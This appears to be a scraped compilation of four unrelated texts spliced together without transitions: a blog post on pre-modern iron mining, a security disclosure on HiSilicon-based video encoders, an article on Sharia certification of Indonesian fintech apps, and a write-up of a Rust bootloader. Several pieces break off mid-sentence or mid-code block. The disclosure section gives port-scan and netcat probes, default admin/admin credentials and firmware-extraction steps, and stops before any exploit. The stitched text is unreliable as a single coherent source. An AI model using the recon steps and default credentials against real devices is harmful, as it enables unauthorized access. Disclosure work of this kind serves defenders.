<p><strong>So this first post is going to focus on mining</strong>.  Next week we’ll take a look at ore processing, smelting in more detail, along with the pressing issue of fuel.  The week after that we’ll look at the basic principles behind forging.  And finally in the last week, we’ll ask what one might do if they wanted <em>steel</em> instead of iron.  As with the farming posts, there are likely to be some addendum (at least one, on Wootz steel, for sure).  <strong>Throughout all of this, we are going to look not only at the processes by which these objects were produced, but also the people who did that production.</strong></p>

By the 1800s, increases demand for iron ore to fuel the industrial revolution had made larger underground iron mines more common.  Here you can actually see the tailings (rock with little or no iron content which is sorted out at the mine) littering the rock face down to the shore.</figcaption></figure>



<p><strong>As with farming, there is a regional and chronological caveat necessary here</strong>: my research into metal production (and this, even more than farming, is core to my academic interests) is focused on the Roman world or – more broadly – on the broader Mediterranean and European tradition of metal-working.  There are some points where it will be necessary to note different methods or techniques in other parts of the world (early cast iron in China, for instance, or Wootz steel in India).  Likewise, I will do my best to capture changes in metal-working techniques in the medieval period.  What I am <em><strong>not </strong></em>going to cover in detail is <em>modern</em> steel and iron-working (that is, post-industrial-revolution), though I will occasionally note how it is different (the largest difference, by far, is that modern steel-making approaches the carbon problem from the opposite direction, with processes to <em>remove</em> carbon, instead of processes to add carbon).</p>



<p>I should also note that this post is going to focus on <em>iron</em>-working (and steel-working).  Copper and bronze, the other major tool-metals, are quite different (and may get their own series at some point)!</p>

<p><strong>Bibliography Note at the Outset</strong>: For the sake of keeping these posts readable, especially since I don’t have a footnote function here, I am not going to laboriously cite everything at each point of reference, but instead I am going to include a bibliography up-front for the entire series.  For the beginner looking to get a basic handle on the pre-modern iron-production process, I think D. Sim &amp; I. Ridge, <em>Iron for the Eagles: The Iron Industry of Roman Britain</em> (2002) offers one of the best whole-process overviews.  On technical details of the forging process, note A.W. Bealer, <em>The Art of Blacksmithing</em> (1969), though much of the same may be learned by conversing with traditional blacksmiths.  H. Hodges, <em>Artifacts: An Introduction to Early Materials and Technology</em> (1989) is more diffuse, but still has some useful information on metal production.<br>There is a robust if somewhat aging literature on Roman mining and metallurgy.  Of particular note are (in publication order) J.F. Healy, <em>Mining and Metallurgy in the Greek and Roman World</em> (1978); R.F. Tylecote, <em>The Early History of Metallurgy in Europe</em> (1987); R. Shepherd, <em>Ancient Mining</em> (1993); P. Craddock, <em>Early Metal Mining and Production </em>(1995); V.F. Buchwald, <em>Iron and Steel in Ancient Times</em> (2005).  Each of these volumes has their own advantages.  Healy and Shepherd are more narrowly focused on Greek and Roman antiquity; Healy has the better coverage of processes, Shepherd the better catalog of known metal mining and processing sites in antiquity.  Both Tylecote and Craddock have a wider chronological reach; Craddock is in some ways an update of Tylecote, but the former has a stronger focus on artifacts than the latter.  Buchwald is narrowly focused on iron (the others all consider at least bronze, if not also non-tool metals) and of course, the most recent.  Finding any study on the condition of medieval mine-workers was difficult (being so far out of my field), but note J.U. Nef, “Mining and Metallurgy in medieval Civilisation” in <em>The Cambridge Economic History</em> <em>of Europe</em>, <em>volume 2: Trade and Industry in the Middle Ages</em>, 2nd. ed. (1987): 691-761.<br>For the particulars of how that iron might be turned into armor, note D. Sim and J. Kaminski, <em>Roman Imperial Armour: The Production of Early Imperial Military Armour</em> (2012) for the Roman period and A. Williams, <em>The Knight and the Blast Furnace: A history of the metallurgy of armour in the Middle Ages &amp; the early modern period</em> (2003).  For metallurgy as it fits into mobilization more generally, J. Landers, <em>The Field and the Forge: Population, Production and Power in the Pre-Industrial West</em> (2003) is a peerless starting point.<br>On the value and trade in metals in the ancient world, of particular note are M. Treister, <em>The Role of Metals in Ancient Greek History</em> (1996) and L. Bray, “‘Horrible, Speculative, Nasty, Dangerous’: Assessing the Value of Roman Iron,” <em>Britannia</em> 41 (2010): 175-185.  Both of these have valuable price-data from the ancient world.</p>



<h2>Iron Ores</h2>



<p>In most video games, if you are looking to produce some iron things, the first problem you invariably have is <em>finding some iron</em> <em>ores</em>.  Often iron is some sort of<a href="https://civilization.fandom.com/wiki/Iron_(Civ4)"> semi-rare strategic resource</a> available in <a href="https://anno1800.fandom.com/wiki/Iron_Mine">only certain parts of the map</a>, something that factions might fight over.  Actually finding some iron might be a serious problem.</p>



<p>Well, I have good news for <em>historical</em> you as compared to <em>video game</em> you: iron is the fourth most common <a href="https://en.wikipedia.org/wiki/Abundance_of_elements_in_Earth%27s_crust#cite_note-7">element in earth’s crust</a>, making up around 5% of the total mass of the part of the earth we can actually mine. Modern industry produces – and I mean this very literally – a <em>billion tons</em> (and change) of iron per year.  Iron is about the exact opposite of rare; almost all of the major ores of iron are dirt common.  <strong>And that’s the point</strong>.</p>



<p>One of the reasons that the change from using bronze (or copper) as tool metals to using iron was so important historically is that iron is just <em>so damn abundant</em>.  Of course iron can be used to make <em>better</em> tools and weapons as well, but only with proper treatment: initially, the advantage in iron was that it was <em>cheap</em>.  Now, as we’ll see, while the abundance of iron makes it cheap, the difficulty in working it poses technological problems; that’s why the far rarer and also generally inferior (to proper, work-hardened, heat-treated iron or steel; bronze will often exceed the performance of unalloyed iron) copper and bronze were used first: harder to find, easier to work.  We’ll get to the major problems with iron-working in subsequent weeks (they are in the processing, not the mining), but in brief the problems iron has is that it has a much higher melting point and that <em>cast</em> iron is functionally useless.  <strong>But let’s get back to those sources of iron</strong>.</p>



<p>Very small amounts of iron occur on earth as pure ‘native’ metal; the term for this, “<a href="https://en.wikipedia.org/wiki/Meteoric_iron">meteoric iron</a>” is an accurate description of where it comes from (there is also one known deposit of native ‘<a href="https://en.wikipedia.org/wiki/Telluric_iron">telluric iron</a>‘); in practice, the sum total of these iron sources is effectively a rounding error on the amount of iron an iron-age society is going to need and so ‘pure’ iron may be disregarded as a meaningful source of iron.</p>

<p><strong>Instead, basically all iron was smelted from iron ores which required considerable processing to produce a pure metal</strong>.  There are quite a lot of ores of iron, but not all of them could be usefully processed with ancient or medieval technology.  The most commonly used iron ore was hematite (Fe<sub>2</sub>O<sub>3</sub>), with goethite (HFeO<sub>2</sub>) and limonite (FeO(OH)·<em>n</em>H<sub>2</sub>O) close behind.

<hr>

<p><strong>Update 2020-09-17:</strong> Huawei <a href="https://www.huawei.com/en/psirt/security-notices/2020/huawei-sn-20200917-01-hisilicon-en">issued a statement</a> saying that none of the vulnerabilities have been introduced by HiSilicon chips and SDK packages. I will update this article as more information comes in.</p>

<hr>

<p>This article discloses critical vulnerabilities in IPTV/H.264/H.265 video encoders based on HiSilicon hi3520d hardware. The vulnerabilities exist in the application software running on these devices. All vulnerabilities are exploitable remotely and can lead to sensitive information exposure, denial of service, and remote code execution resulting in full takeover of the device. With multiple vendors affected, and no complete fixes at the time of the publication, these encoders should only be used on fully trusted networks behind firewalls. I hope that my detailed write-up serves as a guide for more security research in the IoT world.</p>

<p>See <a href="https://www.kb.cert.org/vuls/id/896979">CERT/CC vulnerability note VU#896979</a></p>

<p>During my research I had physical access to several devices from the following vendors: <a href="http://szuray.com/">URayTech</a>, <a href="https://jtechdigital.com/product/jtech-ench4-0220/">J-Tech Digital</a>, and <a href="https://www.provideoinstruments.com/iptv-encoders">Pro Video Instruments</a>. I performed my research initially on URayTech, then confirmed vulnerabilities in the other two vendors.</p>

<p>There is at least a dozen of different vendors that manufacture and sell very similar devices. By analyzing product documentation and firmware update packages, I’ve got a high level of confidence those devices were also affected by most, if not all, vulnerabilities listed here. Here is an [incomplete] list of these additional vendors: <a href="http://www.networktechinc.com/h264-hdmi-encoder.html"><em>Network Technologies Incorporated (NTI)</em></a>, <a href="https://www.oupree.com/IP-Video-Encoder-Decoder/"><em>Oupree</em></a>, <a href="http://www.szmine.com/Video_Encoder/"><em>MINE Technology</em></a>, <a href="https://www.blankom.de/products/irenis-ip-encoder-streamer/"><em>Blankom</em></a>, <a href="https://www.iseevy.com/product-category/video-encoder/"><em>ISEEVY</em></a>, <a href="https://www.orivision.com.cn/c/h264-hdmi-encoder_0017"><em>Orivision</em></a>, <a href="https://www.procoderhd.com/">WorldKast/procoder</a>, <a href="http://www.digicast.cn/en/product.asp?pType=222">Digicast</a></p>

<p>It is my understanding that most of these devices are intended to be used behind NAT/firewall. However, I was able to utilize <a href="http://shodan.io/">shodan.io</a> to identify several hundred devices on the public internet, all likely to be exploitable by an anonymous remote attacker.</p>

<h2 id="background">Background</h2>

<p>Hardware video encoders are used for video streaming over IP networks. They convert raw video signals (such as analog, SDI, HDMI) to H.264 or H.265 streams and send them to a video distribution network (YouTube, Twitch, Facebook,…) or let the users watch the video directly via RTSP, HLS, etc. Normally, these encoders have a web interface to allow the administrator to configure networking, encoding parameters, streaming options, and so on. Many such devices on the market today are based on <a href="http://www.hisilicon.com/en/">HiSilicon</a> (a Huawei brand) hi3520d ARM SoC running a special Linux distribution called HiLinux, with a set of user-space utilities and a custom web application on top.</p>

<p>Security research on HiSilicon devices has been done in the past. Here are some existing publications:</p>

<ul>
  <li><a href="https://habr.com/ru/post/173501/">Root shell in IP cameras</a> (in Russian) by Vladislav Yarmak, 2013. The research uncovered the root password allowing root shell access over telnet.</li>
  <li><a href="https://github.com/tothi/pwn-hisilicon-dvr">HiSilicon DVR hack</a> by Istvan Toth, 2017. This research targeted DVR/NVR devices, and uncovered a root shell access with elevated privileges, a backdoor password, a file disclosure via path traversal, and an exploitable buffer overflow.</li>
  <li><a href="https://habr.com/en/post/486856/">Full disclosure: 0day vulnerability (backdoor) in firmware for Xiaongmai-based DVRs, NVRs and IP cameras</a> by Vladislav Yarmak. This research uncovered a very interesting “port knocking” backdoor allowing a remote attacker to start the telnet, and then log in with one of the several known passwords.</li>
</ul>

<p>While the streaming video encoders may share the same hardware architecture and the underlying Linux system with the above devices, my research targets the <strong>admin web application specific to the video encoders</strong> and does not overlap with the prior work.</p>

<h2 id="hardware">Hardware</h2>

<p>Here is a few pictures of one of the devices I had an opportunity to test.

Let’s plug this thing in, connect to network, and start exploring!</p>

<h2 id="network-recon">Network recon</h2>

<p>A simple <code>nmap</code> scan reports the following open ports:</p>

<div><div><pre><code>$ nmap -p 1-65535 encoder
...
PORT     STATE SERVICE
23/tcp   open  telnet
80/tcp   open  http
554/tcp  open  rtsp
1935/tcp open  rtmp
5150/tcp open  atmp
8086/tcp open  d-s-n
8554/tcp open  rtsp-alt
9588/tcp open  unknown
</code></pre></div></div>

<h3 id="23---telnet">23 - telnet</h3>

<p>Telnet displays the login prompt, but the password is unknown at this point:</p>



<h3 id="80-8086---web-application">80, 8086 - web application</h3>

<p>Both ports serve the main admin web interface. The default credentials are <strong>admin/admin</strong>
<img src="https://kojenov.com/assets/2020-09-15-encoders/110-login.png" alt="login"></p>

<p>The login prompt suggests basic HTTP authentication, but this is actually <a href="https://en.wikipedia.org/wiki/Digest_access_authentication">digest authentication</a>. The following header is returned by the application:</p>

<div><div><pre><code>WWW-Authenticate: Digest qop="auth", ...
</code></pre></div></div>

<p>and the browser authenticates with:</p>

<div><div><pre><code>Authorization: Digest username="admin", ...
</code></pre></div></div>

<p>(as I will demonstrate below, digest is not the only authentication method supported by the application)</p>

<p>After logging in, the user sees a simple web interface.
<img src="https://kojenov.com/assets/2020-09-15-encoders/120-status.png" alt="status"></p>

<p>Note that vendors customize the interface, and your device can display something completely different, such as:
<img src="https://kojenov.com/assets/2020-09-15-encoders/130-status.png" alt="status">However, the underlying functionality (the web API calls) are all the same regardless of the UI.</p>

<p>There are several sections where the administrator can perform various tasks such as setting up the network, adjusting encoder parameters, uploading images to overlay the video, upgrading the firmware, and so on.</p>

<h3 id="554-8554---rtsp">554, 8554 - RTSP</h3>

<p>RTSP stands for <a href="https://en.wikipedia.org/wiki/Real_Time_Streaming_Protocol">Real Time Streaming Protocol</a>. If it’s enabled, one can watch the video stream directly from the encoder.</p>

<div><div><pre><code>$ curl -i rtsp://encoder:554
RTSP/1.0 200 OK
CSeq: 1
Server: Server Version 9.0.6
Public: OPTIONS, DESCRIBE, PLAY, SETUP, SET_PARAMETER, GET_PARAMETER, TEARDOWN
</code></pre></div></div>

<h3 id="1935---rtmp">1935 - RTMP</h3>

<p><a href="https://en.wikipedia.org/wiki/Real-Time_Messaging_Protocol">Real Time Messaging Protocol</a>, another way to deliver video</p>

<h3 id="5150---serial-to-tcp">5150 - serial to TCP</h3>

<p>Mysterious service. <code>netcat</code> connects but the server does not seem to react to any input</p>

<div><div><pre><code>$ nc -v encoder 5150
Connection to encoder 5150 port [tcp/*] succeeded!
foo
bar
...
</code></pre></div></div>

<p>This initially puzzled me, but when playing with devices from other vendors I noticed that some firmwares allowed control over this port:
<img src="https://kojenov.com/assets/2020-09-15-encoders/140-serial.png" alt="serial"></p>

<h3 id="9588---another-web-server">9588 - another web server</h3>

<p>This one is <code>nginx</code>, but not exactly clear what it is for.</p>

<div><div><pre><code>$ curl -i http://encoder:9588

<h2 id="firmware-analysis">Firmware analysis</h2>

<p>Clicking around the web interface, I noticed the backup feature:
<img src="https://kojenov.com/assets/2020-09-15-encoders/150-backup.png" alt="backup">
I immediately went ahead and backed up (i.e. downloaded) both the firmware and the configuration.</p>

<h3 id="content">Content</h3>

<p>The firmware backup is a RAR archive that can be easily unpacked:</p>

<div><div><pre><code>$ file up.rar
up.rar: RAR archive data, v4, os: Win32

$ mkdir up
$ cd up
$ unrar ../up.rar

<p><span>T</span>he average fintech startup founder faces a taxing to-do list: raise seed funding, scope out a user base, recruit talent, build something people will actually use. For the Indonesian entrepreneur, the Muslim-majority market presents an additional hurdle: build an app that is compliant with Islamic religious law, or Sharia.</p>



<p>New fintech startups must present themselves before the Indonesian Ulema Council (Majelis Ulama Indonesia, or MUI, in Bahasa Indonesian), composed of religious clerics from across the archipelago, for Sharia certification, in order to reach Indonesia’s 220 million Muslim users, who generally seek out products that fit their faith.&nbsp;</p>



<p>MUI shapes much of Indonesian life. The body has <a href="https://www.vice.com/en_in/article/bjpwwm/indonesia-just-got-its-first-halal-fridge-heres-a-list-of-everything-else-that-needs-a-stamp">conducted halal audits on household products</a>, verifying that milk, moisturizer, and instant ramen meet strict religious criteria. Its <em>fatwa</em> commission also regularly intervenes in the moral life of Indonesians, promulgating headline-making rulings on <a href="https://www.rappler.com/world/regions/asia-pacific/indonesia/87440-bhimanto-suwastoyo-fatwa-homosexuality-indonesia-death-penalty">homosexuality</a> and <a href="https://academic.oup.com/jis/article-abstract/18/2/202/726927">secularism</a>. Since the late 1990s, when Indonesian politics began a turn toward Islamic conservatism, the council’s influence has grown, according to Syafiq Hasyim, a Jakarta-based scholar of MUI and the political economy.&nbsp;</p>



	




<p>Now MUI is using its policing power to shape a new sector of Indonesian society: consumer technology. In November 2019, Vice President Ma’ruf Amin declared the <a href="https://www.scmp.com/week-asia/economics/article/3044601/how-sharia-economy-shapes-democracy-indonesia">“Shariatization” of the economy</a> — i.e., the growth of digital financial services catering to Muslim users — a priority for the country’s development. Indonesian Muslim consumers currently spend $224 billion annually. When fintech companies build platforms for these users — whether peer-to-peer lending apps, mobile money services, or online stock-trading portals — MUI acts as the arbiter of their religious legitimacy. MUI’s National Sharia Council (Dewan Syariah Nasional, or DSN) issues certificates that verify platforms are compliant with Sharia. The chairman of DSN just happens to be the vice president himself.</p>



<p>To earn a certificate, new startups must adhere to the council’s combined 154 fatwas, a rule book for anyone attempting to build Sharia fintech. New fatwas are added every year on digital finance topics that now include commodities trading online and cryptocurrencies. In the certification process, MUI’s religious scholars become embedded in the early evolution of a company’s digital products, their background not in software engineering or UX design but the traditions and teachings of Islam.</p>

<p>In Sharia, for example, <a href="https://www.investopedia.com/terms/r/riba.asp#:~:text=Riba%20is%20prohibited%20under%20Shari,and%20helping%20others%20through%20kindness.">charging interest, or <em>riba</em></a><em>,</em> is strictly prohibited. Sharia promotes charitable financial dealings and labels interest and guaranteed profits inherently unjust. Instead of a conventional credit model, Sharia lending platforms operate according to <a href="https://www.sciencedirect.com/science/article/pii/S187705091931230X"><em>mudarabah</em></a>. Under this model, rather than a lender extracting a profit from a borrower, the borrower and lender enter a more equitable contract. For a small-business loan, for example, the lender receives a predetermined share of profits but must also share in the losses, since the borrower has invested labor and knowledge in the business. This model underpins a host of peer-to-peer lending apps targeting Muslim users in Indonesia.</p>



<p>For Sharia stock trading, MUI mandates, under <a href="https://drive.google.com/file/d/0BxTl-lNihFyzZUxIbkR3RXV4TWc/view">Fatwa No. 80</a>, that traders invest only in halal companies. Online stock trading platforms like MNC Trade Syariah vet all potential listings accordingly, removing any that deal in gambling, alcohol, or pork products.</p>



<p>For some companies, compliance is more of a challenge. Take LinkAja. <a href="https://kr-asia.com/linkaja-ceo-danu-wicaksana-ready-to-be-the-biggest-mobile-payment-platform-in-indonesia">Launched in June 2019</a> and currently serving 45 million registered users, it’s one of the country’s largest mobile money services <a href="https://www.thejakartapost.com/adv-longform/2019/12/27/why-gojek-users-leave-their-cash-behind-and-turn-to-gopay.html">behind leaders like GoJek’s digital wallet</a> GoPay and OVO. Customers can send, store, or receive electronic money on the LinkAja app. </p>



<p>Late last year, the company announced it was building the first Sharia mobile money product in Indonesia, a digital wallet for Muslim consumers to be called LinkAja Sharia Services. Standard LinkAja app users would be able to go into their settings and switch to a parallel platform built for Sharia compliance. But before they even created a prototype, LinkAja’s team knew they needed to consult MUI.</p>



<p>Most Islamic fintech companies have an appointed head of Sharia, a taskmaster who manages the compliance process. At LinkAja, that person is Widjayanto Djaenudin. While he had no experience in Sharia technology per se, he spent more than a decade at Telkomsel, Indonesia’s largest telecoms operator, developing mobile products for the unbanked. His task at LinkAja was to liaise with MUI and guide the company through its certification process, a challenge, considering the tenuous status of Sharia scholarship on mobile money apps. </p>



<p>Some clerics have argued that <a href="http://www.ikim.gov.my/new-wp/index.php/2019/08/22/some-sharia-considerations-concerning-e-wallet/">digital wallets are a form of <em>haram</em></a>, a term for practices forbidden by Islamic law<em>. </em>The<em> </em>digital-only cash-back rebates and other discounts with partner retailers commonly found on these apps are considered, by some clerics, a form of interest payment between businesses — riba in disguise. MUI has ruled sending and storing money in digital wallets acceptable, but only under strict terms.&nbsp;</p>



<figure><blockquote><p>To earn a certificate, new startups must adhere to the council’s combined 154 fatwas, a rule book for anyone attempting to build Sharia fintech.</p></blockquote></figure>



<p>After conducting a rigorous product-proposal review, MUI appointed a three-member supervisory board to Djaenudin’s team well-versed in the nuances of its rulings. The board included Anwar Abbas, chairman of an Islamic reformist organization in Southern Java’s Yogyakarta and author of a national bestseller promoting the vice president’s “Shariatization” worldview, <a href="https://www.tokopedia.com/dojobuku/ma-ruf-amin-way-sahala-panggabean-by-anwar-abbas"><em>The Ma’ruf Amin Way</em></a><em>. </em>“They are all Sharia experts,” said Djaenudin. “They gave us guidance and consultations about the product.” </p>



<p>Starting in November 2019, shortly after the vice president’s Shariatization initiative, Djaenudin was required to brief these scholars on market research, product testing, and the ins and outs of engineering every month. MUI’s supervisory board would share their insights and ensure the technological infrastructure of the app followed MUI’s rulings.&nbsp;</p>



<p>An MUI fatwa issued in 2017 was of particular concern to Djaenudin. <a href="https://drive.google.com/file/d/1KPAvhhziJ61Pt8EFxxTFfDPNmRHJoQDG/view">Fatwa No. 116</a> begins with verses from the Quran published in both classical Arabic script and Bahasa Indonesian. “O you who have believed, when you contract a debt for a specified term, write it down. And let a scribe write it between you in justice,” reads one verse. They are followed closely by <a href="https://yaqeeninstitute.org/emadhamdeh/are-hadith-necessary/">quotations from books of <em>hadith</em></a>, records of the sayings of the Prophet Muhammad: “Do not sell gold for gold, and do not sell silver for silver, except in case of like for like.”</p>



<p>These threads of theological precedent are woven together to create a set of rulings reinterpreting classical verse for the new digital economy. According to the fatwa, these Quranic lines have a specific implication for fintech: floating funds must be housed in certified Islamic banks. Contracts between all parties — users, banking institutions, or the app itself — must be grounded in Sharia contract law. Any promotional campaign cannot include riba.</p>

<p>The supervisory board had other suggestions for LinkAja’s parallel Sharia platform, Djaenudin told <em>Rest of World</em>. The new version of the app embedded a <em>zakat </em>payment feature, <a href="https://www.islamic-relief.org.uk/about-us/what-we-do/zakat/">a form of religious tithing and worship</a> performed through charitable donations, customarily amounting to 2.5% of one’s total savings. After the board signed off on the feature, LinkAja partnered with 240 MUI-approved charitable institutions and 1,000 mosques nationwide <a href="https://news.detik.com/adv-nhl-detikcom/d-5019749/wahai-umat-muslim-ini-cara-mudah-berzakat-lewat-layanan-syariah-linkaja">to launch the zakat feature</a>. Months of vetting culminated in a full audit of LinkAja’s operations at its Jakarta headquarters by MUI.&nbsp;</p>



<p>According to Widjayanto, LinkAja paid a $300 (4 million rupiah) charge to MUI for its Sharia certificate, which lasts three years, including a $20 transportation fee for the auditor.&nbsp;</p>



<p>LinkAja Sharia Services <a href="https://www.idnfinancials.com/news/33503/link-aja-launches-linkaja-sharia-services">launched on April 14</a>, just one week before the start of Ramadan. In its first month, it saw 100,000 user registrations. Djaenudin credits the MUI Sharia certificate for this first wave of customers. Most Indonesians prefer to use a Sharia-branded service, even if few understand the particulars of riba or mudarabah, according to LinkAja market research. “From the customer’s perspective, as long as they see the halal logo or Sharia certificate from a trusted body, which is MUI, it gives them clearance and trust,” said Djaenudin.</p>



<p>For Indonesian fintech entrepreneurs hoping to establish their Sharia credentials, the MUI certificate has become the gold standard. Ronald Yusuf Wijaya, the founder of two Sharia-compliant crowdfunding startups, converted to Islam while building his business. “It’s been almost nine years, and I’m learning all of this from the day I started my business,” he said. Wijaya is chairman of the <a href="https://fintechsyariah.id/en">Indonesian Sharia Fintech Association (AFSI)</a>, a trade association that lobbies on behalf of <a href="https://www.reuters.com/article/us-indonesia-digitalpayments-islam/sharia-fintech-startups-race-to-tap-indonesia-growth-by-aligning-with-islam-idUSKBN20Q0IA">this burgeoning pocket of the Indonesian economy</a>. Since converting, Wijaya has successfully navigated MUI Sharia certification with both his companies. “Some customers, they ask, ‘Are you certified, or are you just Sharia?’”&nbsp;</p>

<p>For most Sharia fintech startups, MUI certificates are not only commercially advantageous but legally required by the Financial Services Authority of Indonesia (OJK), the state financial regulator. Other areas of the Sharia digital economy, like <a href="https://www.salaamgateway.com/story/indonesian-e-commerce-giant-tokopedia-aiming-for-10-of-total-transactions-to-come-from-new-islamic-m">halal e-commerce</a> and <a href="https://www.salaamgateway.com/story/indonesia-gets-first-diy-umrah-platform-e-commerce-giant-starts-selling-pilgrimage-packages"><em>umrah </em>sites</a>, travel-booking platforms for Islamic pilgrimages, do not require this certificate.&nbsp;</p>



<p>Dr. Ir. H. Nadratuzzaman Hosen, vice chair of DSN MUI, told <em>Rest of World</em> that MUI is a passive actor in the development of new apps — waiting idly for companies to seek its approval rather than imposing fatwas on companies as a theocratic …</p></div></div>

<h2>What motivated me to develop KRaBs?</h2>
<p>I thought that lower level programming below the OS stack could be also made more modern by using Rust. I wanted to extract the minimum essentials from the process of booting the Linux kernel and finally make up original bootloader where there is no black box for me.
<br>
 </p>
<p>In addition: </p>
<ul> <li>It's not easy for me to read the source code of an existing chain loader.</li> <li>Reading large amounts of assembly and C source code is tough for a beginner. It takes a lot of time and effort to read it. </li> <li>It is said that Rust binaries tend to be too big and not suitable for writing bootloaders, but I wondered if it is true.</li> </ul> 
<p>Based on the above, I've decided to write down the bootloader in Rust from scratch. </p>
</section>
<section>
<h2>How KRaBs Works</h2>
</section>
<section>
<h3>Linux kernel bootstrapping mechanism</h3>
<p>While it may be difficult to unravel the Linux kernel bootstrapping mechanism from the bzImage and GRUB bootloader sources, The mechanism itself is surprisingly simple.
<br>
 There are four basic things: Loading the ELF-formatted image from the file system, Relocating it according to the program headers, and initializing system and setting parameters according to The Linux/x86 Boot Protocol. That's all there is to it. </p>
<p>Specifically, the following four types of initialization are performed: </p>
<p><strong>Hardware initialization:</strong> </p><ul> <li>Setting the keyboard repeat rate.</li> <li>Disable interrupts and mask all interrupt levels.</li> <li>Setting Interrupt descriptor (IDT) and segment descriptor (GDT). As a result,</li> all selectors (CS, DS, ES, FS, GS) refer to the 4 Gbyte flat linear address space. <li>Change the address bus to 32 bits (Enable A20 line).</li> <li>Transition to protected mode.</li> <li>If the target is ELF64, set the 4G boot pagetable and transition to long mode.</li> </ul> 
<p><strong>Software initialization:</strong> </p><ul> <li>Get system memory by BIOS call.</li> </ul> 
<p><strong>Information transmission to the kernel:</strong> </p><ul> <li>KRaBs mount the FAT32 EFI System Partition and Reading the CONFIG.TXT.</li> <li>Setting <a target="_blank" rel="noopener noreferrer" href="https://www.kernel.org/doc/html/latest/x86/zero-page.html">Zero Page</a> of kernel parameters and transmit it to the OS.</li> </ul> 
<p><strong>Load items and Relocate the kernel:</strong> </p><ul> <li>Load kernel, initrd and command line according to CONFIG.TXT.</li> <li>The target is an ELF file, KRaBs do the ELF relocation.</li> </ul> 
<p>The format of CONFIG.TXT is a simple matrix-oriented text file that looks like this: </p>
<pre><code>
main.kernel sample-kernel
main.initrd sample-initrd
main.cmdlin sample command line clocksource=tsc net.ifnames=0
</code></pre>
<p>To perform the above process, KRaBs uses a program that is divided into four stages. </p>
</section>
<section>
<h3>Stages Overview</h3>
<ol> <li> stage1  </li> A 446 byte program written to the boot sector. The segment registers(CS, DS, ES, SS) are set to <code>0x07C0</code>, and the stack pointer (ESP) is initialized to <code>0xFFF0</code>. After that, stage2 is loaded to address <code>0x07C0:0x0200</code>, and jumps to address <code>0x07C0:0x0206</code>. In the latter half of stage1, there is an area for storing the sector position and length (in units of 512 bytes) of the stage2 program. <li> stage2  </li> Load stage3 and stage4, then jump to stage3. The stage3 program is loaded at address <code>0x07C0:0x6000</code>, the stage4 is loaded at address <code>0x0003_0000</code> in the extended memory area. The file is read from the disk using a 2K byte track buffer from address <code>0x07C0:0xEE00</code>, and further transferred to an appropriate address using <code>INT 15h</code> BIOS Function <code>0x87h</code>. A mechanism similar to this function is used in stage 4. When the loading of stage3 and stage4 is completed, jump to address <code>0x07C0:0x6000</code>.  <li> stage3  </li> Do hardware and software initialization which need BIOS calls. After a series of initialization, empty_zero_page information is prepared in <code>0x07C0:0x0000</code> to <code>0x07C0:0x0FFF</code>. Enable the A20 line, change the address bus to 32 bits, and shift to the protect mode. Then, jump to the Stage4. <li> stage4  </li> Mount the FAT32 EFI System Partition. Then, read and parse the CONFIG.TXT on that partition. Load ELF kernel image, initrd, and kernel command line according to CONFIG.TXT. Drop to real mode when executing I/O. Set Command line and image informations in empty_zero_page. ELF kernel image is stored to the extended memory address <code>0x100000</code> or later, and then the ELF32/ELF64 file is parsed and loaded. If the target is ELF64, set the 4G boot pagetable and transition to long mode. Finally, jump to the entry point to launch the kernel. At this time, put the physical address (<code>0x00007C00</code>) of the empty_zero_page information prepared in the low-order memory into the <code>ESI</code> or <code>RSI</code> register. <li> plankton🦠  </li> library common to stage1 ~ stage4. </ol> 
</section>
<section>
<h3>How build KRaBs</h3>
<p>The directory structure of the KRaBs project is as follows: </p>
<pre><code>
$ cd /path/to
$ tree . -L 3
.
├── build.rs
├── Cargo.toml
├── rust-toolchain
├── src
│   ├── bios
│   │   ├── plankton
│   │   ├── stage_1st
│   │   ├── stage_2nd
│   │   ├── stage_3rd
│   │   └── stage_4th
│   ├── main.rs
│   └── uefi
...
</code></pre>
<p>All four stages that make up the bootloader for the legacy BIOS and a library called plankton are stored as a sub crate under a directory named <code>src/bios</code>.
<br>
 Under the <code>src/uefi</code> directory, we plan to store UEFI-compatible bootloader crates.
<br>
 All these sub-crates will be built by <code>build.rs</code> at <code>cargo build</code> time.
<br>
 </p>
<p><code>src/main.rs</code> is not the main body of the bootloader, <code>src/main.rs</code> is the CLI program that places KRaBs on the disk. This <code>main.rs</code> will write each stage of the KRaBs to the appropriate location on the disk. The <code>-w</code> option is used to write the stages to disk. </p>
<p>With this directory structure, just run <code>cargo buil</code> to build the CLI and the boot loader, and <code>cargo run -- -w disk.img</code> to burn the boot loader to disk. You can also test it with qemu by running <code>cargo run -- -e disk</code>. </p>
</section>
<section>
<h3>DISK Structure</h3>
<p>KRaBs supports disks that are partitioned in GPT format.
<br>
 The BIOS Boot Partition and the EFI System Partition are required. Place stage1 in the boot sector and stage2 ~ stage4 boot code for legacy BIOS in the BIOS Boot Partition. Place the CONFIG.TXT, Linux kernel, initrd on the FAT32 file system of the EFI System Partition. </p>
<p>Example: </p>
<pre><code>
$ gdisk -l disk.img 
...
Found valid GPT with protective MBR; using GPT.
Disk disk2.img: 204800 sectors, 100.0 MiB
Sector size (logical): 512 bytes
Disk identifier (GUID): 2A1F86BB-74EA-47C5-923A-7A3BAF83B5DF
Partition table holds up to 128 entries
Main partition table begins at sector 2 and ends at sector 33
First usable sector is 34, last usable sector is 204766
Partitions will be aligned on 2048-sector boundaries
Total free space is 2014 sectors (1007.0 KiB)

Number  Start (sector)    End (sector)  Size       Code  Name
   1            2048            4095   1024.0 KiB  EF02  BIOS boot partition
   2            4096          106495   50.0 MiB    EF00  EFI system partition
   3          106496          204766   48.0 MiB    8300  Linux filesystem
</code></pre>
</section>

<h3>Why use EFI System Partition?</h3>
<p>The reason for this is to make this project compatible with the UEFI environment in the future.
<br>
 I didn't support UEFI from the start because: </p>
<ul> <li>This bootloader was originally intended to be used on older PCs, such as the ThinkPad 600X.</li> <li>Currently, Legacy BIOS support works in a wider range system than UEFI.</li> <li>It is mainly intended to be used in the cloud environment except my PC. Legacy BIOS is the mainstream in x86 cloud environment, and there seems to be no merit to replace it with UEFI.</li> </ul> 
</section>
<section>
<h2>Is Rust good for writing a bootloader?</h2>
<p>I know there are pros and cons, but for me, Rust has been so much easier and better than writing C and assemblies. Personally, I think Rust is also pretty good for low-level programming, like bootloaders. </p>
